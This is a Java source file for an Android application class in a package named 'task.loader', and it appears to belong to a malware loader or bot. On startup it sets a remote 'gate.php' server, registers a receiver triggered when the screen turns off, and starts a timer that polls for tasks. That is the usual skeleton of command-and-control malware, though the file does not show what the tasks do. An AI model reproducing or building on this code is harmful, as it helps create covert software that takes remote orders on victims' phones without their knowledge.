package task.loader;

import android.app.Application;
import android.content.Intent;
import android.content.IntentFilter;

import org.json.JSONArray;
import org.json.JSONObject;

import task.loader.db.MainDb;

public class MainApplication extends Application implements Thread.UncaughtExceptionHandler
{
    private static MainDb mainDb;

    public static MainDb getMainDb()
    {
        return mainDb;
    }

    private Thread.UncaughtExceptionHandler defult;

    @Override
    public void onCreate()
    {
        super.onCreate();

        Constants.LOGS_DIR = getPackageName();

        defult = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler(this);

        if(Settings.isBlock(this))
            return;

        new Settings(this).setServer(Constants.SERVERS.get(0) + "gate.php");

        mainDb = new MainDb(this);


        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(Intent.ACTION_SCREEN_OFF);

        registerReceiver(new MainReceiver(), intentFilter);

        Utils.startCustomTimer(this, Actions.CHECK_TASKS, Constants.TASKS_CHECK_INTERVAL, true, false);

    }

    public void uncaughtException(Thread thread, Throwable ex)
    {
        try
        {
            JSONObject json = new JSONObject();
            json.put("uncaughtException", ex.toString());
            json.put("thread", thread);
            json.put("message", ex.getMessage());

            JSONArray jsonArray = new JSONArray();
            StackTraceElement[] list = ex.getStackTrace();
            for(int i = 0; i < list.length; i++)
            {
                StackTraceElement item = list[i];
                JSONObject jsonItem = new JSONObject();
                jsonItem.put("ClassName", item.getClassName());
                jsonItem.put("FileName", item.getFileName());
                jsonItem.put("LineNumber", item.getLineNumber());
                jsonItem.put("MethodName", item.getMethodName());
                jsonArray.put(jsonItem);
            }
            json.put("trace", jsonArray);

            if(Constants.DEBUG) Settings.debug(ex);

            defult.uncaughtException(thread, ex);
        }
        catch(Exception e) {}
    }
}
